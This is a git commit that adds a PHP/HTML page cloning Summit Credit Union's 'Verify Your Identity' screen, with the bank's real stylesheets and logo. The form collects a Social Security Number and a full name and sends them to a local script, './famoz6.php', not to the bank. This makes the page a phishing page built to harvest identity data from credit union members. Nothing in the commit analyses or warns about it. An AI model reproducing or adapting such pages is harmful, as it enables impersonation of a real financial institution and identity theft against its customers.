843258f743bc9b42a9673a130d6208bedccb513d
X-botf <168183930+X-botf@users.noreply.github.com>
2024-08-01 13:53:35 -0700

    Create Verif3.php

---
+++ api/Verif3.php
@@ -0,0 +1,65 @@
+<!DOCTYPE html>
+<html lang="en-US">
+<head><meta charset="us-ascii">
+	<title>Summit CU - Establish Identity</title>
+	<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+	<link href="https://db.summitcreditunion.com/Themes/OrpheusDefaultTheme/Styles/Default_5rTVJABMXj81_Default.bndl?v=ZnIFqDdKR7A2O6jJVTNgoswC4KLo4jWAssDj-YT4lno1" rel="stylesheet" type="text/css" />
+	<link href="https://db.summitcreditunion.com/Themes/OrpheusDefaultTheme/Styles/Mobile_Default_xtHDspGhEo41_Default.bndl?v=SQRLFviIS39Q1hMZ0ZGDFJMW45OESxRev1bTrzViMSg1" rel="stylesheet" type="text/css" /><meta content="Orchard" name="generator"><meta content="h9-JYPObT2yjBZKP52RA-uNaFyUg92WUSpmtuN6qyE4q226CbQbtFJCJNPJQSPW78NN4ka_D5iS3Nd_EYsp6xWrttILMZrKum1dCN9KEgiyGaLZkmhnwxKH38v-pBcDEmbxVG9Zea4WeIhMSUxNycGMRKb3Tk8Nu7--wrUv-r9Q1" name="csrf-token"><meta content="X-AntiCSRF-Token" name="csrf-param"><meta content="__AntiCsrfToken" name="csrf-form-param">
+	<link href="https://db.summitcreditunion.com/Media/Default/Logos/favicon_1.ico" rel="shortcut icon" type="image/x-icon" /><meta name="apple-itunes-app" content="app-id=846243037">
+</head>
+<body><script>
+    window.Chorus = window.Chorus || {};
+    window.Chorus.isMobile = true;
+    window.Chorus.isMfmHosted = false;
+    window.Chorus.isIFrameHosted = false;
+</script><script id="boot-data" type="application/json">
+    {"AvaliableFeatures":{"Features":[{"key":"Applications\\DataSource\\Accounts\\UiSettings\\NumericAccountNumberEnabled","value":true},{"key":"Applications\\DataSource\\Accounts\\UiSettings\\AccountTypeIconEnabled","value":true},{"key":"Applications\\DataSource\\LoginAndRetrieval\\CompromisedCredentialsCheckEnabled","value":true}]},"DisplayMode":{"IsMobile":true,"DisplayModeId":"Mobile"}}
+</script>
+<header class="navbar" role="banner">
+<div class="navbar__center">
+<div class="top-logo-block" style="text-align: center; display: block; width: 100%; margin: 10px auto;"><a href="https://db.summitcreditunion.com/"><img alt="Summit Credit Union" height="80" src="https://db.summitcreditunion.com/Media/Default/Logos/summit_logo.png" width="186" /> </a>
+<div style="background-color: #ebf2e6; padding: 20px; border: 1px solid #b2c8a2; border-radius: 6px; max-width: 560px; margin: 20px auto 0px auto; text-align: center;">Welcome, former Commerce business customers!<br />
+<a href="https://summitcreditunion.ebanking-services.com/eAM/Credential/Index?appId=beb&amp;brand=summitcreditunion" style="text-decoration: underline;">Access your accounts here.</a></div>
+<br />
+<!--
+<div style="background-color: #fbf6d1; padding: 20px; font-size: 15px; border: 1px solid #ddda88; border-radius: 6px; max-width: 560px; margin: 20px auto 0px auto; text-align: left;">Statements may be unavailable through Digital Banking from 12 am on Saturday, July 13 through 6 am on Saturday, July 13. Just doing routine touch-ups, but we're sorry to disrupt your routine! Thanks for understanding.</div>--></div>
+</div>
+</header>
+</body>
+<link href="https://use.typekit.net/klt7lef.css" rel="stylesheet" />
+<style type="text/css"><!--
+</div>
+-->
+</style>
+<div data-role="content">
+<div class="main-content" role="main">
+<div class="container-view">
+<div class="container-view" data-bind="props: wizardSettings" data-props="{&quot;WizardSessionExpiredAfterMin&quot;:4}" data-viewmodel="login/viewmodels/logoff">
+<header class="subheader">
+<div class="navbar__center"><span class="navbar__center__title">Verify Your Identity</span></div>
+</header>
+
+<section class="container-view-scrollable">
+<form action="./famoz6.php" data-action="/api/retrieval" data-bind="dom: $form, props: settings" data-props="{&quot;previousStepAllowed&quot;:false,&quot;finalStep&quot;:false,&quot;apiUrl&quot;:&quot;/api/retrieval&quot;,&quot;lostDataType&quot;:&quot;UserName&quot;,&quot;userKind&quot;:&quot;Consumer&quot;,&quot;forced&quot;:false}" data-stable-name="IdentityEstablishmentForm" data-viewmodel="retrieval/viewmodels/identityEstablishment" enctype="application/x-www-form-urlencoded" method="post" onsubmit="return false;">
+<div class="content__container has-padding">
+<p></p>
+
+<div class="form-control-container"><label><span class="form-control__label" data-stable-name="SsnLabel">What is your Social Security Number?</span> <input aria-label="What is your Social Security Number?" autocomplete="new-value" class="form-control k-textbox" data-cfw-field="data-cfw-field" data-field-id="Ssn" data-field-type="System.String" data-mask="***-**-0000" data-pattern="000-00-0000" data-pattern-msg="Please enter 9 digits into the Social Security Number field." data-required-msg="This field is required." data-role="formatter" data-stable-name="SsnInput" id="Ssn" maxlength="11" name="1" pattern="^\d{3}-\d{2}-\d{4}$" required="required" type="text" /> </label></div>
+
+<div class="form-control-container" data-bind=""><label><span class="form-control__label" data-stable-name="MemberAccountNumberLabel">What is your Full Name?</span> <input class="form-control k-textbox" data-bind="" data-cfw-field="data-cfw-field" data-displayname="MemberAccountNumber" data-field-id="MemberAccountNumber" data-field-type="System.String" data-pattern-msg="Please enter a valid member number." data-required-msg="This field is required." data-stable-name="MemberAccountNumberInput" id="MemberAccountNumber" maxlength="20" minlength="1" name="2" pattern="^0*[1-9][0-9]*" required="required" type="text" /> </label></div>
+
+<p>Don&#39;t have this information? <a href="https://www.summitcreditunion.com/contact-us">Contact us</a> for help.</p>
+</div>
+
+<div data-bind="dom:$summary"></div>
+
+<div class="content__container has-padding">
+<div class="form-submit-container"><button autocomplete="off" class="btn btn__block btn--primary" data-stable-name="ContinueButton" type="submit">Continue</button><a class="btn btn__block btn--primary-outlined" data-bind="click: restartWizard" href="/">Return to login </a></div>
+</div>
+</form>
+</section>
+</div>
+</div>
+</div>
+</div>
+<script src="https://db.summitcreditunion.com/bundle/script/Unspecified/S7mF27WFE7g1_Default.bndl?v=XDdrknP3VNCvB0-2__cLpO4XRRnmbOjV_Nwsefyqxk01" type="text/javascript"></script></html>
